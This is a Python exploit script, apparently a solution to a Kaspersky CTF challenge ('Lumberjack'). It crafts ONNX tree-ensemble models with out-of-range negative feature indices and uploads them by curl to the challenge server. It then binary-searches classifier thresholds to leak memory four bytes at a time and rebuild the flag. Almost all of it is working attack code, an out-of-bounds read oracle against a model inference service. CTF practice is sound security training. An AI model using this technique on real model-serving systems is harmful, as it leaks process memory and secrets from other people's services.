"""Working leaker - fixed exponent range for small floats."""
from sklearn.ensemble import RandomForestClassifier
from skl2onnx import convert_sklearn
from skl2onnx.common.data_types import FloatTensorType
import numpy as np, struct, time, subprocess, re, onnx

BASE = "https://8182d962e8ef479abf53.kit.sasc.tf"
W = "Downloads/KasperskyCTF/Lumberjack"

np.random.seed(99)
X = np.random.randn(20,4).astype(np.float32)
y = (X[:,0]>0).astype(np.int64)
rf = RandomForestClassifier(n_estimators=2, max_depth=1, random_state=99)
rf.fit(X, y)
raw_base = convert_sklearn(rf, initial_types=[('f',FloatTensorType([None,4]))], target_opset=12).SerializeToString()

def q(fidx, thr):
    """True if feature > threshold. Returns None on error, True/False on success."""
    m = onnx.load_model_from_string(raw_base)
    for n in m.graph.node:
        if n.op_type != 'TreeEnsembleClassifier': continue
        modes = [s.decode() for s in next(a.strings for a in n.attribute if a.name=='nodes_modes')]
        for a in n.attribute:
            if a.name == 'class_ids': del a.ints[:]; a.ints.extend([0,1,0,1])
            elif a.name == 'class_weights':
                for i in range(len(a.floats)): a.floats[i] = 0.0 if i%2==0 else 1.0
            elif a.name == 'nodes_featureids':
                v = [fidx if modes[i]!='LEAF' else 0 for i in range(len(a.ints))]
                del a.ints[:]; a.ints.extend(v)
            elif a.name == 'nodes_values':
                v = [float(thr) if modes[i]!='LEAF' else 0.0 for i in range(len(a.floats))]
                del a.floats[:]; a.floats.extend(v)
            elif a.name == 'classlabels_int64s':
                del a.ints[:]; a.ints.extend([0,1])
    path = f'{W}/tq.onnx'
    with open(path, 'wb') as f: f.write(m.SerializeToString())
    for attempt in range(5):
        try:
            r = subprocess.run(['curl','-sL','-D','-','--max-time','15','-X','POST',
                f'{BASE}/upload','-F',f'file=@{path}'], capture_output=True, timeout=20)
            h = re.search(rb'filename=([^\s;]+)', r.stdout)
            if not h: time.sleep(1); continue
            r2 = subprocess.run(['curl','-sL','--max-time','15',f'{BASE}/{h.group(1).decode()}'],
                capture_output=True, text=True, timeout=20)
            if 'Illegitimate' in r2.stdout: return None
            p = re.search(r'probability: ([\d.]+)', r2.stdout)
            if p: return float(p.group(1)) > 0.0
        except: time.sleep(1)
    return None

def leak(idx):
    """Leak 4 bytes at features[idx]. Returns bytes or None."""
    # Phase 1: find exponent range
    lo_exp, hi_exp = -150, 130
    for _ in range(10):
        mid = (lo_exp + hi_exp) / 2.0
        t = 2.0**mid if mid >= -120 else 0.0
        r = q(idx, t)
        if r is None: return None
        lo_exp, hi_exp = (mid, hi_exp) if r else (lo_exp, mid)
    
    # Phase 2: binary search mantissa (32 bits of precision)
    lo, hi = 2.0**max(int(lo_exp)-1, -120), 2.0**(int(hi_exp)+1)
    for _ in range(32):
        mid = (lo + hi) / 2.0
        if mid < 1e-45: mid = 1e-45
        r = q(idx, mid)
        if r is None: return None
        lo, hi = (mid, hi) if r else (lo, mid)
    
    # Phase 3: find exact float32 bytes by testing adjacent values
    hi32 = np.float32(hi)
    raw = int.from_bytes(struct.pack('<f', float(hi32)), 'little')
    for delta in range(-10, 11):
        test_raw = raw + delta
        test_bytes = struct.pack('<I', test_raw)
        test_val = struct.unpack('<f', test_bytes)[0]
        r = q(idx, test_val)
        if r is None: continue
        if not r: return test_bytes
    return struct.pack('<f', hi)

flag = b''
for idx in range(-16, -5):
    print(f"idx={idx}:", end=' ', flush=True)
    b = leak(idx)
    if b: flag += b; print(f"{b.hex()} '{b.decode('ascii','replace')}'")
    else: flag += b'\x00\x00\x00\x00'; print("FAIL")
    print(f"  => {flag.decode('ascii','replace')}")

print(f"\nFLAG: {flag.decode('ascii','replace')}")